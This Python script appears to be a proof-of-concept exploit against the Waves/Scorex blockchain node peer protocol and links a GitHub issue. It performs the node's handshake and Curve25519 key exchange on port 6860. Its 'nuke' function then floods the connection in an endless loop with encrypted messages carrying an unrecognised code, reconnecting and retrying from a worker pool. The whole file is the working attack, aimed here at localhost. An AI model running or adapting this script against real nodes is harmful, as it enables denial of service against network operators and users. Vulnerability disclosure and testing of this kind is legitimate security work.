#!/usr/bin/python3

# More details: https://github.com/wavesplatform/Scorex/issues/109#issuecomment-249111898

import socket, time, random, struct
from pyblake2 import blake2b
from multiprocessing import Pool
from Crypto.Cipher import AES

# This is pycurve25519, not curve25519-donna
import curve25519

target = "127.0.0.1"

TCP_PORT = 6860
BUFFER_SIZE = 1024
CONNECTIONS = 1

def generate_handshake():
    import random
    nonce = b""
    for i in range(8):
        nonce += bytearray((random.randint(0,255),))
    HANDSHAKE = b"""\x05\x77\x61\x76\x65\x73\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x00\
\x00\x04\x05\x62\x63\x64\x65\x76""" + nonce + b"""\
\x00\x00\x00\x00\x00\x00\x00\x00\
\x57\xda\x74\xf9"""
    return HANDSHAKE

def generate_message(msgCode, data):
    # Message:
    # Length - 4 bytes, 0x100000 is MAX
    # MAGIC - 4 bytes - \x12\x34\x56\x78
    # 
    # Message code - 1 byte
    # Data length - 4 bytes signed
    # Data checksum - 4 bytes - algorithm unknown
    # Data - length bytes

    MAGIC = b'\x12\x34\x56\x78'
    a=blake2b(digest_size=32);a.update(data);crc=a.digest()[:4]
    if len(data) == 0:
        message_size = len(data) + len(MAGIC) + len(msgCode) + 4
        return struct.pack(">L", message_size) + MAGIC + msgCode + struct.pack(">L", len(data)) + data
    else:
        message_size = len(data) + len(MAGIC) + len(crc) + len(msgCode) + 4
        return struct.pack(">L", message_size) + MAGIC + msgCode + struct.pack(">L", len(data)) + crc + data

def generate_message_encryptionpubkey(public):
    # Curve25519 public key - 32 bytes
    data = []
    peers = 1
    return generate_message(b'\x7e', public)

def generate_message_start_encryption():
    return generate_message(b'\x7f', b'')

def read_message_encryptionpubkey(message):
    message = message[-49:]
    msg_code = message[8]
    if msg_code != 126:
        print(message)
        print("Wrong message code!!!", msg_code)
        raise Exception
    pub_key = message[-32:]
    print("Encryption private key:", pub_key)
    return pub_key

def xor(x, message):
    res = b''
    for c in message:
        res += bytearray(((c ^ x), ))
#        print(hex(c), hex(x), hex(c^x), bytearray(((c ^ x), )))
    return res

def nuke(meh):
    while True:
        try:
            private = curve25519.genkey()
            public = curve25519.public(private)
            

            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#            s.setblocking(0)
            s.connect((target, TCP_PORT))
            s.send(generate_handshake())
            remote_public = s.recv(1024) # Handshake

            time.sleep(0.01)
            s.send(generate_message_encryptionpubkey(public))
            time.sleep(0.2)

            remote_public = read_message_encryptionpubkey(s.recv(1024))

            shared_secret = curve25519.shared(private, remote_public)

            key_out = b''
            key_in = b''
            for byte in shared_secret:
                key_out += bytearray((byte ^ 0x55, ))
                key_in += bytearray((byte ^ 0xaa, ))
            a=blake2b(digest_size=32);a.update(key_in);key_in=a.digest()[:16]
            a=blake2b(digest_size=32);a.update(key_out);key_out=a.digest()[:16]

            a=blake2b(digest_size=32);a.update(key_in);iv_in=a.digest()[:16]
            a=blake2b(digest_size=32);a.update(key_out);iv_out=a.digest()[:16]

            print("Shared encryption secret:", shared_secret)
            print("Key_in", key_in)
            print("Key_out", key_out)

            print("Out encryption key", key_out[0])
#            print(xor(10, generate_message(b'\xaa', b'')))

            aes = AES.new(key_out, AES.MODE_CFB, iv_out, segment_size=8)
#            print("Enc sample:", aes.encrypt(b'abra_kadabra'))

            s.send(generate_message_start_encryption())
#            time.sleep(0.2)
            while True:
                s.send(aes.encrypt(generate_message(b'\xaa', b'')))
                time.sleep(0.5)
            s.send(xor(10, generate_message(b'\xaa', b'')))
            s.send(xor(10, generate_message(b'\xaa', b'')))
            time.sleep(2)
            s.close()
        except ConnectionRefusedError:
            pass
        except Exception:
            import traceback
            traceback.print_exc()
        print("NEXT TRY!!!\n\n\n\n")
        time.sleep(1)

p = Pool(CONNECTIONS)
p.map(nuke, range(CONNECTIONS))
time.sleep(666666)
